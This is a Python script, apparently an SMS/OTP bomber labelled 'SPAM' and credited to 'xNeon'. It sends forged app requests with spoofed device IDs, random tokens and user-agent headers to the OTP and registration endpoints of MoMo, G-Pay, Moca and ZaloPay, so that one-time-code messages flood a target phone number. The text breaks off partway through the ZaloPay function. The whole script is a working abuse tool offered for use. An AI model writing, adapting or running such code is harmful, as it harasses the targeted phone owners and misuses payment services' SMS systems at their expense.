import os
import threading
import requests
from pystyle import *
import time
import sys
import uuid
import random
import socket
import requests


class SPAM:
    def __init__(self):
        self.blue = Col.light_blue
        self.lblue = Colors.StaticMIX((Col.light_blue, Col.white, Col.white))
        self.red = Colors.StaticMIX((Col.red, Col.white, Col.white))
        self.appVer = 40012
        self.appCode = '4.0.1'
        self.time_zone = int(round(time.time() * 1))
        self.imei = uuid.uuid4()
        self.token = f'{self.random_string(22)}:{self.random_string(53)}-{self.random_string(86)}'
        self.headers = {
            'Host': 'api.momo.vn',
            'msgtype': 'SEND_OTP_MSG',
            'Accept': 'application/json',
            'agent_id': 'undefined',
            'app_version': '31161',
            'Authorization': 'Bearer undefined',
            'user_phone': 'undefined',
            'app_code': '3.1.16',
            'Accept-Language': 'vi-vn',
            'device_os': 'IOS',
            'lang': 'vi',
            'User-Agent': 'MoMoPlatform-Release/31161 CFNetwork/1240.0.4 Darwin/20.5.0',   
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36', 
    'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13(KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13', 
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.205.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.4 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0 (x86_64); de-DE) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-DE) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/525.13.',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.201.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',
        }
        self.ua = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36', 
    'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13(KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13', 
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.205.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.4 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0 (x86_64); de-DE) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-DE) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/525.13.',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.201.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.201.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.1 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.11 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.2 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196.0 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196 Safari/532.0',
'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',
}
    def format_print(self, symbol, text):
        return f"""                      {Col.Symbol(symbol, self.lblue, self.blue)} {self.lblue}{text}{Col.reset}"""
    def format_input(self, symbol, text):
        return f"""                      {Col.Symbol(symbol, self.red, self.blue)} {self.red}{text}{Col.reset}"""
    def banner(self):
        os.system("cls" if os.name == "nt" else "clear")
        title = '\n\n\n\x1b[31m--- By PhamDinhQuoc aka xNeon ---'
        banner = '''\n
\x1b[31m╩╦══════════════════════════════╦╩

██╗  ██╗███╗   ██╗███████╗ ██████╗ ███╗   ██╗
╚██╗██╔╝████╗  ██║██╔════╝██╔═══██╗████╗  ██║
 ╚███╔╝ ██╔██╗ ██║█████╗  ██║   ██║██╔██╗ ██║
 ██╔██╗ ██║╚██╗██║██╔══╝  ██║   ██║██║╚██╗██║
██╔╝ ██╗██║ ╚████║███████╗╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
                                             
\x1b[31m╦╩══════════════════════════════╩╦
 \x1b[38;5;231mAdmin\x1b[31m:   \x1b[38;5;231mPhamDinhQuoc
\x1b[31m╩╦══════════════════════════════╦╩ 
                               \n\n'''
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_gray)), Center.XCenter(title)) + Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.light_blue)), Center.XCenter(banner)))
    def random_string(self, length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
    def checkdvc(self):
        while True:
            json_data = {
                'user': self.phone,
                'msgType': 'CHECK_USER_BE_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }

            response = requests.post('https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG', headers=self.headers, json=json_data)
            time.sleep(500)
    def send_otp(self):
        json_data = {
                'user': self.phone,
                'msgType': 'SEND_OTP_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'extra': {
                    'action': 'SEND',
                    'rkey': self.random_string(20),
                    'IDFA': '',
                    'SIMULATOR': False,
                    'TOKEN': self.token,
                    'ONESIGNAL_TOKEN': self.token,
                    'SECUREID': '',
                    'MODELID': str(self.imei),
                    'DEVICE_TOKEN': '',
                    'isVoice': False,
                    'REQUIRE_HASH_STRING_OTP': True,
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG', headers=self.headers, json=json_data).json()['errorDesc']
            if 'Thành công' in response:
                print(self.format_print("*",f"MOMO: {response}"))
            else:
                print(self.format_print("*",f"MOMO: "+response))
        except:
            print(self.format_print("*",f"MOMO: BAD REQUESTS LIMIT!"))
    def send_code(self):
        json_data = {
                'user': self.phone,
                'msgType': 'REG_DEVICE_MSG',
                'momoMsg': {
                    '_class': 'mservice.backend.entity.msg.RegDeviceMsg',
                    'number': self.phone,
                    'imei': str(self.imei),
                    'cname': 'Vietnam',
                    'ccode': '084',
                    'device': 'iPhone',
                    'firmware': '14.6',
                    'hardware': 'iPhone',
                    'manufacture': 'Apple',
                    'csp': 'Carrier',
                    'icc': '',
                    'mcc': '0',
                    'mnc': '0',
                    'device_os': 'ios',
                    'secure_id': '',
                },
                'extra': {
                    'ohash': 'a55b1a625c9e36b3e2a001db13f18ad3afd6e0a19dcae6066566ba1f5f14e3d6',
                    'IDFA': '',
                    'SIMULATOR': False,
                    'TOKEN': self.token,
                    'ONESIGNAL_TOKEN': self.token,
                    'SECUREID': '',
                    'MODELID': str(self.imei),
                    'DEVICE_TOKEN': '',
                },
                'appVer': self.appVer,
                'appCode': self.appCode,
                'lang': 'vi',
                'deviceOS': 'ios',
                'channel': 'APP',
                'buildNumber': 0,
                'appId': 'vn.momo.platform',
                'cmdId': f'{self.time_zone}000000',
                'time': self.time_zone,
            }
        try:
            response = requests.post('https://api.momo.vn/backend/otp-app/public/REG_DEVICE_MSG', headers=self.headers, json=json_data).json()['errorDesc']
            print(self.format_print("*",f"MOMO: "+response))
        except:
            print(self.format_print("*",f"MOMO: BAD REQUESTS LIMIT!"))
    def Gbay(self):
        json_data = {
            'phone_number': self.phone,
            'hash': self.random_string(40),
        }
        try:
            response = requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()['meta']['msg']
            print(self.format_print("*",f"GBAY: SUCCESS!"))
        except:
            print(self.format_print("*",f"GBAY: ERROR!"))
    
    def moca(self):
        headers = {
            'Host': 'moca.vn',
            'Accept': '*/*',
            'Device-Token': str(self.imei),
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Language': 'vi',
            'X-Moca-Api-Version': '2',
            'platform': 'P_IOS-2.10.42',
            'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)',
        }
        params = {
                'phoneNumber': self.phone,
            }
        try:
            home = requests.get('https://moca.vn/moca/v2/users/role', params=params, headers=headers).json()
            token = home['data']['registrationId']
            response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headers).json()
            print(self.format_print("*",f"MOCA: SUCCESS!"))
        except:
            print(self.format_print("*",f"MOCA: ERROR!"))
            
    def zalopay(self):
        try:
            headers = {
                'Host': 'api.zalopay.vn',
                'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
                'x-device-model': 'iPhone8,2',
                'x-density': 'iphone3x',
                'authorization': 'Bearer ',
                'x-device-os': 'IOS',
                'x-drsite': 'off',
                'accept': '*/*',
                'x-app-version': '7.13.1',
                'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
                'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
                'x-platform': 'NATIVE',
                'x-os-version': '14.6',
            }
            params = {
                'phone_number': self.phone,
            }

